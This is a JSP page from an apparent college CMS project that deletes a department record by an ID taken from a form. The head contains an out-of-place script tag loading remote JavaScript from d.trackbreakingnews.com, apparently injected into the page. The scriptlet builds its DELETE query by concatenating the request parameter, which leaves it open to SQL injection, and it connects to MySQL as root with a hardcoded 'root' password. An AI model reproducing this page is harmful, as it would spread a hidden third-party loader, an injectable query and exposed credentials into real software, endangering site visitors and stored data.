<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
 <%@ page import="java.sql.*" %>
      <%@ page import= "java.io.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Profile</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  
  
  </head> <style>
   
.HX h2{

	text-align: left;
	color: #fff;
	font-size: 39px;
	font-family: Lato;
	font-weight: bolder;
}

.HX p{

	text-align: left;
	font-weight: bold;
	color: #fff;
	font-size: 22px;
	font-family: Lato;
}

.LS {

	border-radius: 8px;
}


.LS1 {

	border-radius: 8px;
}
.Fot{
	width:100%;
	top:350px;
	position:relative;
	padding-top:30px;
	background-color:#000;
	text-align: center;
	
}
.XLL {
	
	width:360px;
	height:290px;
	background-color: #fff;
}
.XL {
	position:relative;
	right:-25px;
	width: 300px;
	height: 40px;
	padding-top:18px;
}
  body{

	background-image:url("iWall/appx.jpg");
	background-size:cover;
}
 .ZX a{
    color:#fff;
    font-family: Lato;
    font-weight: 800px;
    text-decoration: none;
    
    }
    .ZX a:hover{
    color:#17AEDF;
    font-family: Droid-sans;
    font-weight: bold;
    text-decoration: none;
    
    }
    </style>
    <body>
    		<%
  		String user=(String) session.getAttribute("xmail");
  		String user1=(String) session.getAttribute("xuser");
  		String guest1=(String) session.getAttribute("xguest");
  	  		if((user==null)&&(user1==null) && (guest1==null)){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>	<BR/><BR/><BR/>
  		<div class="container">
<div class="row">
<div class="col-lg-3">
	<ul class="nav nav-pills nav-stacked" id="sidebar"><hr>
<div class="progress">
  <div class="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 100%;">
    <span class="sr-only"></span>
  </div>
</div>
  <li role="presentation" class="active fadeInDown animated"><a href="News.jsp">News-Events</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Data1.jsp">DashBoard</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="UserManage.jsp">User Registration</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Manage.jsp">User Management</a></li>
  <li role="presentation" class="fadeInDown animated"><a href="Department.jsp">Department</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="FeedDel.jsp">Manage Feedback</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Msg2.jsp">Manage Messages</a></li>
 <li role="presentation" class="active fadeInDown animated"><a href="Sview.jsp">Syllabus</a></li>
 <li role="presentation" class="active fadeInDown animated"><a href="home.jsp">Quiz</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="About.jsp">About Us</a><hr></li>
</ul>
</div>	<div class="col-lg-6"><BR/><BR/><BR/>
  		 <form class="form-group" method="post" action="DepartmentDel.jsp">
                     	<input type="text" class="form-control" name="name" placeholder="Enter Department ID" required autofocus> <br/>
                   	  <button type="submit"class="btn btn-danger pull-right" > Delete</button> <br/>
					  </form></div></div>
	<div class="navbar navbar-inverse navbar-fixed-top fadeIn animated">
	<div class="container">
		<a class="navbar-brand" href="#">CMS
		
		</a>
		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="navbar-collapse">
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
		</button>
			<div class="collapse navbar-collapse"> 
				<ul class="nav navbar-nav navbar-right"> 
					<li> <a href="Home.jsp">Home</a></li>
             </div>
								    </div>
								 </div>


<br/><br/><br/>
       				 
                     
                    </div>
            </div>
        </div>
<%
try{
	    	    Class.forName("com.mysql.jdbc.Driver");
   		    	Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
				String n=request.getParameter("name");
				String str="delete from department where departmentid='"+n+"'";
			    PreparedStatement ps=con.prepareStatement(str);
			    int i=ps.executeUpdate();
			    if(i>0) {
				RequestDispatcher rd=request.getRequestDispatcher("Department.jsp");
				rd.forward(request,response);
			    } else {
			    	out.println("Record not Found");
			    	RequestDispatcher rd=request.getRequestDispatcher("DepartmentDel.jsp");
					rd.forward(request,response);
			    }
			     con.close();
	    	}              catch(Exception e) {
    System.out.println(e); 
}
		




%>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
